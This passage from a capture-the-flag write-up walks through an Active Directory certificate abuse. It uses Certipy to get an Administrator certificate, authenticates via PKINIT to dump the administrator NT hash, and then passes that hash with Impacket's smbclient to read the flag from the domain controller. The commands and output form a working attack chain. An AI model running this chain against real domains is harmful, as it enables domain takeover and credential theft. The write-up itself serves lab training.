Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@core.corp'
[*] Certificate object SID is 'S-1-5-21-2429661416-260090189-2427659033-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Now we have a certificate as the administrator, we can authenticate with PKINIT:
```
$ certipy auth -pfx administrator.pfx -dc-ip 10.83.17.129
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@core.corp'
[*]     Security Extension SID: 'S-1-5-21-2429661416-260090189-2427659033-500'
[*] Using principal: 'administrator@core.corp'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@core.corp': aad3b435b51404eeaad3b435b51404ee:f19cc9248311568c3c5ee85126b620a9
```

With the hash of administrator we can read the flag over SMB:
```
$ smbclient.py 'Administrator'@DC02.core.corp -hashes :f19cc9248311568c3c5ee85126b620a9
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C$
# cd Users
# cd Administrator
# cd Desktop
# cat flag.txt
PP{trvst-th3-c3rt1f1c4t3-ch41n}
```

And we're done, with a final flag of `PP{trvst-th3-c3rt1f1c4t3-ch41n}`.